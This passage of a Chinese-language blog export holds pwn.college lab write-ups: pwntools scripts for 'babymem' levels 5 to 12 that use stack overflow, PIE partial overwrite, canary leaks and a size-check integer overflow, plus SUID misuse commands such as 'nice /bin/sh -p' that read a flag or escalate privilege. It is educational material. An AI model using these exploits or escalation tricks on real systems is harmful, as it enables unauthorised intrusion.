</p>\n<p>​        4294967297是1，</p>\n<p>​        18446744073709551617</p>\n<p>2147483649</p>\n<p>​        去找了一下官方的teaching，发现思路其实并不是uint与int之间的强制类型转换，而是uint32和uint64之间强制类型转换导致的溢出。除了最后的size计算时，将v33转化成uint64，其他的变量都是uint32，<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%884.15.22.png\" alt=\"截屏2022-03-07 下午4.15.22\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level5.0&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">win = <span class=\"number\">0x4022E7</span></span><br><span class=\"line\"><span class=\"comment\">#payload = b&#x27;a&#x27;*40+b&quot;\\x48&quot;+ b&quot;a&quot;*2</span></span><br><span class=\"line\">payload =  <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">136</span> + p64(win)</span><br><span class=\"line\"><span class=\"comment\">#80+8 canary:16</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;2147483649&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4><span id=\"level51\">Level5.1</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level5.1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">win = <span class=\"number\">0x40173B</span></span><br><span class=\"line\"><span class=\"comment\">#payload = b&#x27;a&#x27;*40+b&quot;\\x48&quot;+ b&quot;a&quot;*2</span></span><br><span class=\"line\">payload =  <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">88</span> + p64(win)</span><br><span class=\"line\"><span class=\"comment\">#80+8 canary:16</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;2147483649&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h4><span id=\"level60\">Level6.0</span></h4><p>​        利用gadget的思想，直接将地址填成flag，而绕过win的检测。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./babymem_level5.0&quot;)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level6.0&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"><span class=\"comment\">#pad = 0x401B5 #0x30</span></span><br><span class=\"line\">win_addr = <span class=\"number\">0x401693</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">152</span>+ p64(win_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;160&quot;</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h4><span id=\"level61\">Level6.1</span></h4><p>​        同理。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./babymem_level6.1&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;/challenge/babymem_level6.1&quot;)</span></span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\"><span class=\"comment\">#pad = 0x401B5 #0x30</span></span><br><span class=\"line\">win_addr = <span class=\"number\">0x4013BA</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">152</span>+ p64(win_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;160&quot;</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4><span id=\"level70\">Level7.0</span></h4><p>​        开始考pie的绕过了，不走寻常路啊。</p>\n<p>​        之前讲到pie的绕过，一般是部分覆写，以及脚本爆破。</p>\n<p>​        地址的后三个字符永远一致，所以只需爆破第四位，就能将<code>retn</code>覆盖成<code>win</code>    。</p>\n<p>​        （话说如此我其实从来没有写过爆破pie的脚本。。。。所以说为什么不走寻常路，别的题一般都是五花八门的glibc或者漏洞点，然后用pie增加难度。没有pie做不出来，有pie更加做不出来了，然而这个题目就纯纯地考pie，真的牛）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./babymem_level7.0&quot;)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level7.0&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"><span class=\"comment\">#pad = 0x401B5 #0x30</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">136</span>+ <span class=\"string\">b&quot;\\xf4\\xbb&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;144&quot;</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>多执行，总会爆出来的，不过爆之前先在本地调一调，不然有什么错的地方就冤大头了。</p>\n<h4><span id=\"level71\">Level7.1</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./babymem_level7.1&quot;)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level8.0&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pad = 0x401B5 #0x30</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">152</span>+ <span class=\"string\">b&quot;\\xa4\\xb0&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;160&quot;</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4><span id=\"level80\">Level8.0</span></h4><p>​        好像是又对输入size做了过滤。所以就用到另外一个trick，就是针对strlen的check可以用空字符绕过。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./babymem_level8.0&quot;)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level8.0&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">152</span> + <span class=\"string\">b&quot;\\xa4\\xb0&quot;</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;160&quot;</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\">\t\t</span><br></pre></td></tr></table></figure>\n<h4><span id=\"level81\">Level8.1</span></h4><p>​        同理</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./babymem_level8.1&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;/challenge/babymem_level8.1&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">104</span> + <span class=\"string\">b&quot;\\x7e\\x79&quot;</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;112&quot;</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4><span id=\"level90\">Level9.0</span></h4><p>​        以程序构造出的漏洞将输入写在canary后。这里需要写104个padding，同时72个padding加上<code>\\x60</code>直接绕到canary后覆写。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level9.1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">72</span>+<span class=\"string\">b&quot;\\x60&quot;</span>+ <span class=\"string\">b&quot;\\xbe\\xc5&quot;</span>*<span class=\"number\">6</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;106&quot;</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4><span id=\"level91\">Level9.1</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-06%20%E4%B8%8B%E5%8D%889.00.44.png\" alt=\"截屏2022-03-06 下午9.00.44\">        </p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level9.1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">40</span>+<span class=\"string\">b&quot;\\x47&quot;</span>+ <span class=\"string\">b&quot;\\x26\\x46&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;77&quot;</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>​        n的数量和size都需要精准控制才能拿flag。</p>\n<h4><span id=\"level100\">Level10.0</span></h4><p>​        其实虽然盯着伪代码盯了很久但是感觉并没有实际理解这道题。目前我的疑惑有二：</p>\n<ol>\n<li>为什么flag被load进了内存，并且也给出了它在栈中实际的地址，但是栈上对应的地址显示的是0.</li>\n<li>这道题的思路应该是通过后面那个you say来打印flag，但是如何将payload的指针覆盖为flag的指针？    </li>\n</ol>\n<p>​    </p>\n<p>​        解答一下，第一个问题其实很不应该，显示为0就是因为没有权限。然后第二个问题，覆盖payload指针的思路至少不应该在这个module出现，这道题的漏洞点就是payload的区域和flag的区域在栈上是连续的，只要覆盖掉截断payload的输出的空字符就可以一直输出栈上的内容，包括flag。</p>\n<p>​        ps，包括其他题也是，如果有疑惑其实可以找一下官方的teaching视频（但是也有很多没有就是了）</p>\n<p>​        </p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level10.0&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload =  <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">111</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;150&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br></pre></td></tr></table></figure>\n<h4><span id=\"level101\">Level10.1</span></h4><p>​        同</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level10.1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload =  <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">79</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;150&quot;</span>)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4><span id=\"level110\">Level11.0</span></h4><p>​        也是类似的思路，但是这里倒不是栈地址了，不过区别不大，只是输入的payload大些。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level11.0&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#payload = b&#x27;a&#x27;*40+b&quot;\\x48&quot;+ b&quot;a&quot;*2</span></span><br><span class=\"line\">payload =  <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">24577</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;24600&quot;</span>)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h4><span id=\"level111\">level11.1</span></h4><p>​        同理</p>\n<p>​    （ps：size是我随便填的。但是也不能太随便，得先<code>vmmap</code>看看flag和input buffer被映射到了哪里）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level11.1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload =  <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">12289</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;12400&quot;</span>)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4><span id=\"level120\">level12.0</span></h4><p>​        这道题的trick就在于可以反复调用函数<code>challenge</code>，每一次调用虽然栈会被clear但是canary不变，从而泄露canary。思路其实比较简单，但是调试有些令人恼火。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level12.0&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload1 =  <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">35</span>+<span class=\"string\">b&quot;REPEAT&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;41&quot;</span>)</span><br><span class=\"line\">p.send(payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;You said:&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">canary = u64(p.recv()[<span class=\"number\">41</span>:<span class=\"number\">49</span>])</span><br><span class=\"line\">canary  -= <span class=\"number\">0x54</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">41</span> + p64(canary) + <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span> + <span class=\"string\">b&quot;\\x91\\xb0&quot;</span></span><br><span class=\"line\">p.send(<span class=\"string\">&#x27;100&#x27;</span>)</span><br><span class=\"line\">p.send(payload2)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h4><span id=\"level121\">Level12.1</span></h4><p>​    同理，但是需要好好调。 </p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./babymem_level12.1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload1 =  <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">83</span>+<span class=\"string\">b&quot;REPEAT&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;89&quot;</span>)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">p.send(payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;You said:&#x27;</span>)</span><br><span class=\"line\">canary = u64(p.recv()[<span class=\"number\">89</span>:<span class=\"number\">97</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">canary  -= <span class=\"number\">0x54</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(canary))</span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">89</span> + p64(canary) + <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span> + <span class=\"string\">b&quot;\\x63\\x18&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(<span class=\"string\">&#x27;112&#x27;</span>)</span><br><span class=\"line\">p.send(payload2)</span><br><span class=\"line\">pause()</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4><span id=\"level130\">level13.0</span></h4><p>​        。。输几个a就有flag，具体方法看13.1。</p>\n<h4><span id=\"level131\">level13.1</span></h4><p>​        我觉得是最简单的level了。。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8B%E5%8D%882.35.04.png\" alt=\"截屏2022-03-10 下午2.35.04\"></p>\n<p>​        找到input buffer和flag间地址的填充量，填大于等于的a就行，数量没有必要精确。这个题脚本都没有写，实在太傻逼了。</p>\n<h4><span id=\"level14\">level14</span></h4><p>​        其实我觉得这个题没有写的必要了，纯纯的就是13和12的结合。</p>\n<h4><span id=\"level150\">level15.0</span></h4><p>​        一个奇怪的socket网络通信，我觉得思路是通过fork多个子进程来leak canary，但是由于从来没有接触过，所以先研究一会儿吧。</p>\n","categories":["Binary_security"],"tags":["pwncollege"]},{"title":"ProgramMisuse","url":"/2022/03/03/pwn.college_ProgramMisuse/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-DUUdjWyR\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<p>​        关于这个module，做出题目的话大致有两个思路，一个是利用<code>/bin/sh</code>    来对整个shell提权，另外一个是利用设置了suid的特殊程序来读取flag。一般来说是第二个方法比较简单，但是有时候只有第一个方法可以行得通。</p>\n<h4><span id=\"level1\">Level1</span></h4><p>​        没有看视频，并不知道这个Misuse是什么意义，但是level1只要执行给的程序就能get flag。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-26%20%E4%B8%8B%E5%8D%884.56.40.png\" alt=\"截屏2022-01-26 下午4.56.40\"></p>\n<h4><span id=\"level2\">Level2</span></h4><p>​        到第二题大概懂它的用意了，来补充一些知识吧。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-26%20%E4%B8%8B%E5%8D%884.57.44.png\" alt=\"截屏2022-01-26 下午4.57.44\"></p>\n<p>​        可以看到原本我们只用普通用户权限，但是由于可执行程序将 <code>/usr/bin/more</code>    设置为了超级权限，使得这个功能能够读取到flag的内容。</p>\n<p>​        然后关于SUID，也就是Set uid ID。如果将对应位设置为S，就能够以可执行文件的owner权限执行它们。</p>\n<p>​        （SUID）仅对二进制可执行文件有效。</p>\n<p>参考：[<a href=\"https://www.cnblogs.com/sparkdev/p/9651622.html\">Linux 特殊权限 SUID,SGID,SBIT </a>]</p>\n<h4><span id=\"level3-9\">Level3-9</span></h4><p>​        <code>xxx flag</code></p>\n<h4><span id=\"level-10\">Level 10</span></h4><p>​        指令为<code>rev</code>，所以对于获得的flag我们需要翻转一下，可以就直接用<code>rev</code>来。</p>\n<h4><span id=\"level-11\">Level 11</span></h4><p>​        控制<code>od</code>的参数，并需要简单的脚本处理字符串的空格。</p>\n<h4><span id=\"level12-17\">Level12-17</span></h4><p>​        按照给的可执行文件来。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-01-28%20%E4%B8%8B%E5%8D%886.34.25.png\" alt=\"截屏2022-01-28 下午6.34.25\"></p>\n<p>​        之前碰到这个问题的时候并咩有理解，现在算是理解了。</p>\n<h4><span id=\"level21\">Level21</span></h4><p><code>ar -r a flag</code></p>\n<p><code>cat a</code></p>\n<h4><span id=\"level27\">Level27</span></h4><p><code>nice /bin/sh -p</code></p>\n<h4><span id=\"level28\">Level28</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-02%20%E4%B8%8B%E5%8D%885.09.57.png\" alt=\"截屏2022-03-02 下午5.09.57\"></p>\n<h4><span id=\"level29\">Level29</span></h4><p>​        利用<code>stdbuf</code>设置输出缓冲为0，利用<code>/bin/sh</code>执行并提权。</p>\n<h4><span id=\"level30\">Level30</span></h4><p>​    </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.38.12.png\" alt=\"截屏2022-03-03 上午9.38.12\"></p>\n<h4><span id=\"level34\">Level34</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.50.31.png\" alt=\"截屏2022-03-03 上午9.50.31\"></p>\n<h4><span id=\"level35\">Level35</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.55.21.png\" alt=\"截屏2022-03-03 上午9.55.21\"></p>\n<h4><span id=\"level36\">Level36</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%889.57.38.png\" alt=\"截屏2022-03-03 上午9.57.38\"></p>\n<h4><span id=\"level37\">Level37</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.00.42.png\" alt=\"截屏2022-03-03 上午10.00.42\"></p>\n<h4><span id=\"level38\">Level38</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.02.08.png\" alt=\"截屏2022-03-03 上午10.02.08\"></p>\n<h4><span id=\"level39\">level39</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.04.09.png\" alt=\"截屏2022-03-03 上午10.04.09\"></p>\n<h4><span id=\"level41\">Level41<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.17.52.png\" alt=\"截屏2022-03-03 上午10.17.52\"></span></h4><h4><span id=\"level42\">Level42</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.20.23.png\" alt=\"截屏2022-03-03 上午10.20.23\"></p>\n<h4><span id=\"level45\">Level45</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.52.14.png\" alt=\"截屏2022-03-03 上午10.52.14\"></p>\n<h4><span id=\"level47\">Level47</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8810.59.45.png\" alt=\"截屏2022-03-03 上午10.59.45\"></p>\n<h4><span id=\"level49\">Level49</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-03%20%E4%B8%8A%E5%8D%8811.05.44.png\" alt=\"截屏2022-03-03 上午11.05.44\"></p>\n","categories":["Binary_security"],"tags":["pwncollege"]},{"title":"Program_interaction","url":"/2022/01/17/pwn.college_Program_interaction/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-OVsLeAdD\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" 